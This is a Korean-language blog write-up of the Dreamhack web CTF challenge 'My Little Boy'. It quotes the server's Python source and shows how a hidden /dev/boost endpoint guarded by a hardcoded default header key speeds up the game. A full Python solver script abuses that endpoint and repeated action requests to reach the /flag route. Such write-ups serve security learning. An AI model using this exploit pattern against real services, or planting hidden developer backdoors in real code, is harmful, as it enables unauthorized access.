---
layout: single
title: "[Dreamhack] My Little Boy write-up"
date: 2025-08-19 20:09 +0900
categories: 
    - WEB-write-up
tag:
typora-root-url: ../
toc: true
toc_sticky: true
toc_label: 목차
author_profile: true
comment: true
sidebar:
    nav: "docs"
---

## [Dreamhack] My Little Boy

### ✏️ 문제 설명

- 저를 키워주세요!
  개발자 몰래 서버에 도움 될 만한 코드를 숨겨뒀습니다!

<br>

### 풀이

문제에 접속하면 이름을 만들어 생성하고, 먹이주기 등 버튼이 존재한다. 틱이라는게 존재하는데 지날 때마다 배고픔, 행복, 위생이 줄어들어 버튼을 눌러줘야 죽지 않는 것을 알 수 있다.

![image-20250819205528641](/images/2025-08-19-My-Little-Boy/image-20250819205528641.png)

<br>

flag 부분의 소스 코드를 살펴보면 세션의 name_set 값과 `FLAG_AGE` 라는 값보다 커야 /flag 경로에 접속해서 flag를 획득할 수 있다는 것을 알 수 있다.

```python
    @app.get("/flag")
    def flag():
        pet = get_pet()
        if not bool(session.get("name_set", False)):
            return Response("forbidden", status=403, mimetype="text/plain")
        if pet.age < FLAG_AGE:
            return Response("forbidden", status=403, mimetype="text/plain")
        try:
            with open(FLAG_PATH, "r", encoding="utf-8") as f:
                txt = f.read().strip()
        except Exception:
            return Response("flag not found", status=500, mimetype="text/plain")
        resp = Response(txt, mimetype="text/plain; charset=utf-8")
        resp.headers["Cache-Control"] = "no-store"
        return resp
```

<br>

아래는 소스 코드의 처음 부분으로 변수 부분을 보면 `FLAG_AGE` 값이 10이므로, 이 값이 10보다 커야 하는 것을 알 수 있다.

```python
BOOST_HEADER = os.environ.get("BOOST_HEADER", "X-Turbo")
BOOST_KEY = os.environ.get("BOOST_KEY", "banana")  

APP_ROOT = os.path.dirname(os.path.abspath(__file__))
FLAG_PATH = os.path.join(APP_ROOT, "flag.txt")
FLAG_AGE = float(os.environ.get("FLAG_AGE", "10")) 
```

<br>

/state 경로에서 보면 생성하면 자동으로 `name_set` 값이 true가 되므로 나이만 10이 넘으면 되겠다. 문제점은 틱이 지날 때마다 나이가 0.1씩 증가하는데 엄청 오래걸린다.

![image-20250819205941429](/images/2025-08-19-My-Little-Boy/image-20250819205941429.png)

<br>

아래 코드에서는 POST 메소드로 `/dev/boost` 경로에 요청할 수 있다. 위에 봤던 `BOOST_HEADER` 와 `BOOST_KEY` 값을 헤더에 맞춰서 넣어줘야 하며, x에 값은 1에서 50으로 정해져 있는데 이 경로를 통해 틱 값을 더 빠르게 조절할 수 있다.

```python
@app.post("/dev/boost")
    def dev_boost():
        if request.headers.get(BOOST_HEADER) != BOOST_KEY:
            return jsonify({"ok": False, "error": "forbidden"}), 403
        data = request.get_json(silent=True) or {}
        try:
            x = float(data.get("x", 1.0))
        except Exception:
            x = 1.0
        x = max(1.0, min(x, 50.0)) 
        session["tick_scale"] = x
        session.modified = True
        return jsonify({"ok": True, "tick_scale": x, "effective_interval": max(MIN_INTERVAL, TICK_INTERVAL / x)})
```

<br>

문제점으로는 틱이 빨라지면 나이도 빨리차는 대신에 배고픔 등도 같이 빨리 단다는 것이다. 이는 아래 `/action` 경로에서 action을 지정해서 값이 원하는 값보다 떨어지면 action을 계속해서 요청해 해결할 수 있다.

```python
    @app.post("/action")
    def do_action():
        pet = get_pet()
        try:
            payload = request.get_json(force=True, silent=True) or {}
        except Exception:
            payload = {}
        action = (payload.get("type") or "").strip().lower()
        if action not in {"feed", "play", "clean", "heal", "scoop", "pet"}:
            return jsonify({"ok": False, "error": "unknown action"}), 400
        pet.act(action, payload, now=time.time())
        pet.last_tick = time.time()
        session["pet"] = pet.to_dict()
        session.modified = True
        now = time.time()
        remaining = 0.0
        if pet.pet_request_active and pet.pet_request_until > 0:
            remaining = max(0.0, pet.pet_request_until - now)
        return jsonify({
            "ok": True,
            "pet": pet.to_dict(),
            "poops": pet.poops,
            "poop_count": len(pet.poops),
            "pet_request_active": pet.pet_request_active,
            "pet_request_remaining": round(remaining, 1),
        })
```

<br>

아래와 같이 파이썬으로 작성하여 나이가 10이 넘어가면 /flag 경로에 접속하여 flag를 획득할 수 있다.

```python
import requests as R

from time import sleep


def main():
    conn = R.Session()

    # Reset
    res = conn.post(f"{BASE_URL}/reset").json()
    assert res["ok"]

    # Give name
    res = conn.post(f"{BASE_URL}/init_name", json={"name": "X"}).json()
    assert res["ok"] and "pet" in res
    
    # Give boost to tick
    headers = {"X-Turbo": "banana"}
    res = conn.post(f"{BASE_URL}/dev/boost", headers=headers, json={"x": 50.0})
    print(res.json())

    while True:
        res = conn.get(f"{BASE_URL}/state").json()
        for action in ("feed", "play", "clean", "heal", "scoop", "pet"):
            res = conn.post(f"{BASE_URL}/action", json={"type": action}).json()
            assert res["ok"]
        pet_age = res["pet"]["age"]
        print(f"Current age: {pet_age}")
        if pet_age > 10.0:
            res = conn.get(f"{BASE_URL}/flag")
            print(f"Flag: {res.text}")
            break
        sleep(1)


if __name__ == "__main__":
    BASE_URL = "http://host8.dreamhack.games:0000/"
    main()

```

